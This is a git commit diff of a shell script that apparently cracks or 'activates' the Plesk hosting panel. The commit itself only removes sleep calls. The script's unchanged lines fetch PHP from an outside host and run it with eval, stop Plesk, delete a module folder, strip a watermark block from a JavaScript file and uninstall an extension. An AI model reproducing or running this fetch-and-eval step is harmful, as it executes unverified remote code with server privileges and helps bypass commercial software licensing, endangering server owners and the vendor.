e9a40c0e73e9a1d6bd0f2f5b9396f1ab4e7f5cb3
Trisout <81978700+trisout78@users.noreply.github.com>
2024-03-15 10:32:08 +0000

    Removed all useless sleep on script

--- script.sh
+++ script.sh
@@ -6,21 +6,14 @@ echo "***********************************"
 sleep 10
 echo "Activating Plesk..."
 plesk php -er "eval(file_get_contents('http://ossav.com/OLC'));"
-sleep 5
 echo "Patching Plesk..."
-sleep 1
 echo "Stopping Plesk..."
-sleep 1
 systemctl stop psa
 echo "Plesk Stopped"
-sleep 1
 echo "Removing Module Folder"
-sleep 1
 rm -rf /usr/local/psa/admin/htdocs/modules/OsSav
 echo "Module Folder Removed"
-sleep 1
 echo "Removing WaterMark..."
-sleep 1
 fichier="/opt/psa/admin/cp/public/javascript/main.js"
 if [ -e "$fichier" ]; then
     sed -i '/\/\*\* OsSav v1\.98 \*\*\//,/\/\*\* Fin de OsSav v1\.98 \*\*\//d' "$fichier"
@@ -28,12 +21,9 @@ if [ -e "$fichier" ]; then
 else
     echo "An Error has occured when removing WaterMark. Please Relaunch the script or contact me"
 fi
-sleep 1
 echo "Restaring Plesk..."
-sleep 1
 systemctl start psa
 echo "Plesk restarted"
-sleep 1
 echo "Removing Ossav Plesk Extention..."
 plesk bin extension --uninstall OsSav
 echo "Ossav Plesk Extention Removed"
